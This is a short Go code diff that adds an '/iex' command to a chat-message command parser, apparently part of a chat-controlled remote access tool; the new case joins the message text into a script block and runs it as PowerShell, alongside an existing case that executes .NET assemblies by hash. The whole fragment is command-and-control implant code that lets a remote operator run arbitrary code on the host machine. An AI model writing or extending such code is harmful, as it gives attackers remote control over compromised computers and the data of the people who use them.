@@ -37,6 +37,13 @@ func parseCommand(chatID int64, text string) {
 		assemblyHash := commandParts[1]
 		assemblyArgs := commandParts[2:]
 		executeAssemblyByHash(chatID, assemblyHash, assemblyArgs, "")
+	case "/iex":
+		scriptBlock := []string{"return"}
+		scriptBlockStr := strings.TrimSpace(strings.Join(commandParts[1:], " "))
+		if scriptBlockStr != "" {
+			scriptBlock = strings.Split(scriptBlockStr, " ")
+		}
+		executePowershell(chatID, scriptBlock, "")
 	default:
 		SendMessage(chatID, "No such command 🥴")
 	}
